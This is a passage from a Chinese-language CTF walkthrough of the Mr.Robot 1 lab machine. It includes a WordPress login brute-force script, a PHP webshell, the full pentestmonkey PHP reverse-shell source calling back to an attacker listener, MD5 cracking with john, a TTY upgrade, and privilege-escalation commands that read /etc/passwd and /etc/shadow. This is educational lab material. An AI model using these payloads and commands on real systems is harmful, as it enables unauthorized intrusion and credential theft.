class="built_in">enumerate</span>(pwds, <span class="number">1</span>):</span><br><span class="line">    data = {</span><br><span class="line">        <span class="string">"log"</span>: <span class="string">"elliot"</span>,</span><br><span class="line">        <span class="string">"pwd"</span>: pw,</span><br><span class="line">        <span class="string">"wp-submit"</span>: <span class="string">"Log In"</span>,</span><br><span class="line">        <span class="string">"redirect_to"</span>: <span class="string">"http://10.0.2.3/wp-admin/"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(URL, data=data, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] 请求失败: <span class="subst">{pw}</span> (<span class="subst">{e.__class__.__name__}</span>)"</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"\n[+] 密码命中: <span class="subst">{pw}</span>"</span>)</span><br><span class="line">        found.append(pw)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"...已测试 <span class="subst">{i}</span>/<span class="subst">{<span class="built_in">len</span>(pwds)}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n结果: 有效密码 -&gt; <span class="subst">{found}</span>"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n结果: 字典里没有命中任何密码"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120438902_x67957.webp" loading='lazy'></p>
+<p>账号：elliot</p>
+<p>密码：ER28-0652</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120440848_nso9ia.webp" loading='lazy'></p>
+<hr>
+<h2 id="3-3-从后台到-shell"><a href="#3-3-从后台到-shell" class="headerlink" title="3.3 从后台到 shell"></a>3.3 从后台到 shell</h2><h3 id="3-3-1-评论功能存在-XSS"><a href="#3-3-1-评论功能存在-XSS" class="headerlink" title="3.3.1 评论功能存在 XSS"></a>3.3.1 评论功能存在 XSS</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120442761_wtf6r2.webp" loading='lazy'></p>
+<p>但是这个貌似没有什么用</p>
+<hr>
+<h3 id="3-3-2-发现了主题文件编辑器"><a href="#3-3-2-发现了主题文件编辑器" class="headerlink" title="3.3.2 发现了主题文件编辑器"></a>3.3.2 发现了主题文件编辑器</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120444354_d0q69u.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-3-3-上传-webshell"><a href="#3-3-3-上传-webshell" class="headerlink" title="3.3.3 上传 webshell"></a>3.3.3 上传 webshell</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120446219_muotgn.webp" loading='lazy'></p>
+<p>访问：<code>http://10.0.2.3/wp-admin/header.php</code></p>
+<p>GET 传参：<code>?cmd=id</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120447921_1554hg.webp" loading='lazy'></p>
+<hr>
+<h2 id="3-4-找其他的-key"><a href="#3-4-找其他的-key" class="headerlink" title="3.4 找其他的 key"></a>3.4 找其他的 key</h2><h3 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h3><p>我们在信息收集的时候已经找过，</p>
+<p>key1：073403c8a58a1f80d943455fb30724b9</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120449666_gw53iv.webp" loading='lazy'></p>
+<h3 id="key2"><a href="#key2" class="headerlink" title="key2"></a>key2</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">ls</span> /</span><br><span class="line">cmd=<span class="built_in">ls</span> /home</span><br><span class="line">cmd=<span class="built_in">ls</span> /home/robot</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120450943_gwrtv8.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120452694_47dk8x.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120453934_zsbh1z.webp" loading='lazy'></p>
+<hr>
+<h4 id="1-读取-key2"><a href="#1-读取-key2" class="headerlink" title="1. 读取 key2"></a>1. 读取 key2</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span> /home/robot/key-2-of-3.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120455391_bg382q.webp" loading='lazy'></p>
+<p>没有返回任何东西</p>
+<hr>
+<h4 id="2-查看文件权限"><a href="#2-查看文件权限" class="headerlink" title="2. 查看文件权限"></a>2. 查看文件权限</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">ls</span> -la /home/robot</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120456727_vg4ckc.webp" loading='lazy'></p>
+<blockquote>
+<p>-r——– 1 robot robot 33  key-2-of-3.txt     ← 只有 robot 自己能读</p>
+<p>-rw-r–r– 1 robot robot 39  password.raw-md5   ← 所有人可读！</p>
+</blockquote>
+<hr>
+<h4 id="3-读-password-raw-md5"><a href="#3-读-password-raw-md5" class="headerlink" title="3. 读 password.raw-md5"></a>3. 读 password.raw-md5</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span> /home/robot/password.raw-md5</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120458345_2dragb.webp" loading='lazy'></p>
+<p>md5 解码</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"c3fcd3d76192e4007dfb496cca67e13b"</span> &gt; hash.txt</span><br><span class="line"><span class="built_in">cat</span> hash.txt</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果遇到没有找到 rockyou.txt 的情况，先看看是否解压</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120459897_uypifn.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120461800_8gldae.webp" loading='lazy'></p>
+<hr>
+<h2 id="3-5-升级成交互式-shell"><a href="#3-5-升级成交互式-shell" class="headerlink" title="3.5 升级成交互式 shell"></a>3.5 升级成交互式 shell</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Kali 里开监听</span></span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120463014_nm11k0.webp" loading='lazy'></p>
+<h3 id="3-5-1-PHP-反向连接-shell-脚本"><a href="#3-5-1-PHP-反向连接-shell-脚本" class="headerlink" title="3.5.1 PHP 反向连接 shell 脚本"></a>3.5.1 PHP 反向连接 shell 脚本</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="line">// do not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed in the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License for more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License</span><br><span class="line">// along with this program; if not, write to the Free Software</span><br><span class="line">// Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA</span><br><span class="line">//</span><br><span class="line">// This script may be used and modified with or without attribution</span><br><span class="line">// (although third party mods must be distributed with the GPL).</span><br><span class="line">//</span><br><span class="line">// The shell should operate in PHP safe mode when this code is included</span><br><span class="line">// (I think...).</span><br><span class="line">//</span><br><span class="line">// Note that the PHP shell will not work on Windows.  It's for Linux/Unix only.</span><br><span class="line">//</span><br><span class="line">// See http://pentestmonkey.net/tools/web-shells/php-reverse-shell for more info</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VERSION = <span class="string">"1.0"</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ip = <span class="string">'10.0.2.15'</span>;  // Kali监听IP</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">port = 4444;       // 监听端口，如4444</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">chunk_size = 1400;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">write_a = null;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">error_a = null;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">daemon = 0;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">debug = 0;</span></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself if possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line">if (function_exists('pcntl_fork')) {</span><br><span class="line">	// Fork and have the parent process exit</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">pid = pcntl_fork();</span></span><br><span class="line">	</span><br><span class="line">	if ($pid == -1) {</span><br><span class="line">		printit("ERROR: Can't fork");</span><br><span class="line">		exit(1);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	if ($pid) {</span><br><span class="line">		exit(0);  // Parent exits</span><br><span class="line">	}</span><br><span class="line">	// Make the current process a session leader</span><br><span class="line">	// Will only succeed if we forked</span><br><span class="line">	if (posix_setsid() == -1) {</span><br><span class="line">		printit("Error: Can't setsid()");</span><br><span class="line">		exit(1);</span><br><span class="line">	}</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">daemon = 1;</span></span><br><span class="line">} else {</span><br><span class="line">	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line">chdir("/");</span><br><span class="line"></span><br><span class="line">// Remove any umask we inherited</span><br><span class="line">umask(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Open the reverse shell.</span><br><span class="line">//</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">socket = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span></span><br><span class="line">if (!$socket) {</span><br><span class="line">	printit("$errstr ($errno)");</span><br><span class="line">	exit(1);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Launch the shell.</span><br><span class="line">//</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">pipes = array();</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">proc = proc_open(<span class="variable">$shell</span>, array(</span></span><br><span class="line">	0 =&gt; array("pipe", "r"),  // stdin</span><br><span class="line">	1 =&gt; array("pipe", "w"),  // stdout</span><br><span class="line">	2 =&gt; array("pipe", "w")   // stderr</span><br><span class="line">), $pipes);</span><br><span class="line"></span><br><span class="line">if (!is_resource($proc)) {</span><br><span class="line">	printit("ERROR: Can't spawn shell");</span><br><span class="line">	exit(1);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span><br><span class="line"><span class="meta prompt_">stream_set_blocking($</span><span class="language-bash">pipes[0], 0);</span></span><br><span class="line"><span class="meta prompt_">stream_set_blocking($</span><span class="language-bash">pipes[1], 0);</span></span><br><span class="line"><span class="meta prompt_">stream_set_blocking($</span><span class="language-bash">pipes[2], 0);</span></span><br><span class="line"><span class="meta prompt_">stream_set_blocking($</span><span class="language-bash">socket, 0);</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">descriptorspec = array(</span></span><br><span class="line">   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from</span><br><span class="line">   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">while (true) {</span><br><span class="line"></span><br><span class="line">	// Wait until there is data on a pipe, then read it.</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash"><span class="built_in">read</span> = array(<span class="variable">$pipes</span>[1], <span class="variable">$pipes</span>[2], <span class="variable">$socket</span>);</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">write = array();</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">except = array();</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">num_changed_streams = stream_select(<span class="variable">$read</span>, <span class="variable">$write</span>, <span class="variable">$except</span>, null);</span></span><br><span class="line"></span><br><span class="line">	if ($num_changed_streams === false) {</span><br><span class="line">		printit("ERROR: stream_select failed");</span><br><span class="line">		break;</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	if ($num_changed_streams &gt; 0) {</span><br><span class="line">		</span><br><span class="line">		// Got data from the shell's stdout or stderr.  Send it down the socket.</span><br><span class="line">		foreach ($read as $r) {</span><br><span class="line">			if ($r == $pipes[1] || $r == $pipes[2]) {</span><br><span class="line">				$data = fread($r, $chunk_size);</span><br><span class="line">				if ($data === false || strlen($data) == 0) {</span><br><span class="line">					// shell has died</span><br><span class="line">					printit("ERROR: Shell process terminated.");</span><br><span class="line">					exit(1);</span><br><span class="line">				}</span><br><span class="line">				fwrite($socket, $data);</span><br><span class="line">			} else if ($r == $socket) {</span><br><span class="line">				// Got data from socket. Send it to shell's stdin.</span><br><span class="line">				$data = fread($socket, $chunk_size);</span><br><span class="line">				if ($data === false || strlen($data) == 0) {</span><br><span class="line">					// remote end closed connection</span><br><span class="line">					printit("ERROR: Remote host closed the connection.");</span><br><span class="line">					exit(1);</span><br><span class="line">				}</span><br><span class="line">				fwrite($pipes[0], $data);</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">socket);</span></span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">pipes[0]);</span></span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">pipes[1]);</span></span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">pipes[2]);</span></span><br><span class="line"><span class="meta prompt_">proc_close($</span><span class="language-bash">proc);</span></span><br><span class="line"></span><br><span class="line">// --- Helper function ---</span><br><span class="line">function printit($string) {</span><br><span class="line">	if ($GLOBALS['debug']) {</span><br><span class="line">		fwrite(STDERR, $string . "\n");</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>脚本放 404.php，当访问不存在的路径时触发</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120464429_53gfb2.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120466838_heb1ho.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-5-2-访问：-http-10-0-2-3-wp-admin-abc-php"><a href="#3-5-2-访问：-http-10-0-2-3-wp-admin-abc-php" class="headerlink" title="3.5.2 访问： http://10.0.2.3/wp-admin/abc.php"></a>3.5.2 访问： <code>http://10.0.2.3/wp-admin/abc.php</code></h3><p>回到 nc， 发现shell 应该已经躺在那了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120468513_b9lswk.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-5-3-TTY-交互式升级"><a href="#3-5-3-TTY-交互式升级" class="headerlink" title="3.5.3 TTY 交互式升级"></a>3.5.3 TTY 交互式升级</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120470002_riwvfm.webp" loading='lazy'></p>
+<p>报错含义：拿到的反弹shell<strong>没有TTY虚拟终端</strong>，<code>su</code>、<code>sudo</code>这类命令必须在真实终端环境才能运行。</p>
+<h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h4><table>
+<thead>
+<tr>
+<th>名词</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TTY</td>
+<td>Unix的虚拟终端。负责：Ctrl+C信号转发、密码输入回显控制、作业控制。没有TTY，su/sudo无法执行。</td>
+</tr>
+<tr>
+<td>普通反弹shell</td>
+<td>IO走socket网线通道，<strong>没有TTY设备</strong>；直接敲<code>/bin/bash</code>不会生成TTY，环境不变。</td>
+</tr>
+<tr>
+<td>python pty</td>
+<td>pty模块在靶机上<strong>创建虚拟TTY设备</strong>，把bash挂载到这个虚拟终端上，完成shell升级。</td>
+</tr>
+</tbody></table>
+<h4 id="2-升级命令"><a href="#2-升级命令" class="headerlink" title="2. 升级命令"></a>2. 升级命令</h4><p>Python2（老靶场常用）</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Python3（新系统）</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120471172_mvlgc4.webp" loading='lazy'></p>
+<hr>
+<h2 id="3-6-切换到-robot，读取-key2"><a href="#3-6-切换到-robot，读取-key2" class="headerlink" title="3.6  切换到 robot，读取 key2"></a>3.6  切换到 robot，读取 key2</h2><p>之前 md5 解密直接用在线网站更方便</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120472929_efs4hg.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su robot</span><br><span class="line">// 密码是：abcdefghijklmnopqrstuvwxyz</span><br><span class="line"><span class="built_in">cat</span> /home/robot/key-2-of-3.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120474179_h879sb.webp" loading='lazy'></p>
+<p>key2：822c73956184f694993bede3eb39f959</p>
+<hr>
+<h2 id="3-7-提权，找-key3"><a href="#3-7-提权，找-key3" class="headerlink" title="3.7 提权，找 key3"></a>3.7 提权，找 key3</h2><p>home 找完了，找 root</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120475390_pt56l9.webp" loading='lazy'></p>
+<hr>
+<h3 id="Q：现在不能-sudo，怎么提权？"><a href="#Q：现在不能-sudo，怎么提权？" class="headerlink" title="Q：现在不能 sudo，怎么提权？"></a>Q：现在不能 sudo，怎么提权？</h3><p>robot不在sudoers名单就不能sudo。</p>
+<p>既然<code>sudo</code>这条路走不通，就要换Linux提权思路</p>
+<ol>
+<li>查找<strong>具有SUID权限的可执行文件</strong></li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u+s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>查看定时任务 cron（计划任务漏洞）</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">ls</span> -l /etc/cron.*</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="3">
+<li>查找高权限可写文件、弱权限配置文件</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="4">
+<li>查看系统版本、内核漏洞（脏牛等）</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="5">
+<li>查看有没有其他用户密码、数据库密码、密钥：</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow  <span class="comment"># 要看shadow需要root权限，现在大概率读不了</span></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
